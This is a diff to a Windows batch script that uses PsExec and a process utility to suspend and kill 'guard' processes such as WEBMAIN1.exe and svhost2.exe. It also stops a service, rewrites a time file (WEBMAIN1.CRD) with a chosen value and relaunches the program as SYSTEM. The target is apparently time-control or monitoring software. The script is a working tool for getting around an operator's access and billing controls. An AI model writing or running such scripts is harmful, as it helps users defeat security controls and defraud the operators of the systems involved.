@@ -6,6 +6,7 @@
 ::|| 010.exe is process.exe from http://retired.beyondlogic.org/solutions/processutil/processutil.htm
 ::|| -k to kill, -s to suspend, -r to resume
 ::|| 020.exe is PsExec from http://technet.microsoft.com/en-us/sysinternals/bb897553
+
 @echo off
 reg.exe ADD "HKCU\Software\Sysinternals\PsExec" /v EulaAccepted /t REG_DWORD /d 1 /f
 
@@ -23,7 +24,7 @@ IF "%time%"=="s" (start 020 cmd && goto start)
 
 :://Input checking ::(Minor bug with multiple errors, displays last one only)
 set "error="
-IF not "%time:~2,1%"==":" (set error=colon(:) missing)
+IF not "%time:~2,1%"==":" (set error=colon missing)
 IF not "%time:~5,1%"==""  (set error=more than 5 chars)
 IF     "%time:~4,1%"==""  (set error=less than 5 chars) 
 IF not "%time:~0,1%"=="0" (set error=hours1 not 0)
@@ -38,12 +39,15 @@ copy 010.exe c:\
 copy 020.exe c:\
 
 :://Kill the guards
-c:
-cd C:\
+c: && cd C:\
 echo @echo off>1.bat
+echo c: ^&^& cd c:\>>1.bat
+
 echo 010 -s WEBMAIN1.exe>>1.bat
 echo 010 -s svhost2.exe>>1.bat
+echo net stop svchost3>>1.bat
 echo 010 -k WEBMAIN1.exe>>1.bat
+
 IF /i "%2"=="k" (echo I will just kill then) && goto launch_rocket
 
 :://Edit the time
@@ -56,6 +60,7 @@ echo echo %time%:00^>WEBMAIN1.CRD>>1.bat
 echo c:>>1.bat
 echo start "title" "C:\WEBMAIn\WEBMAIN1.exe">>1.bat
 
+
 :launch_rocket
+if "%errorlevel%"=="1" (echo ERROR!!!, %errorlevel% && pause) 
 020.exe -i -d -s C:\1.bat
-pause
